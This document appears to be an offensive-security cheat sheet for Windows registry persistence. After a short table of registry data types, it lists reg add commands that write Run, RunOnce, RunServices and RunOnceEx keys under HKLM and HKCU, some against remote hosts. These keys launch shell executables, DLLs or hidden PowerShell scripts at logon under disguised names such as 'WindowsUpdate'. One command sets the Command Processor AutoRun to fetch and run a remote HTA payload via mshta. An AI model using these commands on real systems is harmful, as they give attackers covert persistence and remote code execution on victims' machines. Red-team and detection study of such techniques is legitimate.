# Registry Key References

## Table Reference

|reg.exe|Set-ItemProperty|DataType in .reg|
|-------|----------------|----------------|
|REG_SZ|String||
|REG_EXPAND_SZ|ExpandString|hexadecimal(2)|
|REG_DWORD|DWord|dword|
|REG_QWORD|QWord|qword|
|REG_MULTI_SZ|MultiString|hexadecimal(7)|
|REG_BINARY|Binary|hexadecimal|

## Registry Paths

### HKLM

```
C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v UpdateOnce /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /v WindowsService /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce /v UpdateSVC /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v Dependency /t REG_SZ /d "C:\path\to\shell.dll"
```

### HKCU

```
C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "powershell.exe -ep bypass -w hidden -nologo -NonI -f C:\path\to\shell.ps1" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v WindowsUpdate /t REG_SZ /d "rundll32.exe C:\path\to\shell.dll,ExecuteShell" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\SOFTWARE\Microsoft\Command Processor /v AutoRun /t REG_SZ /d "powershell.exe Start-Process -windowstyle hidden -FilePath mshta.exe http://<IP>/shell.hta" /f
```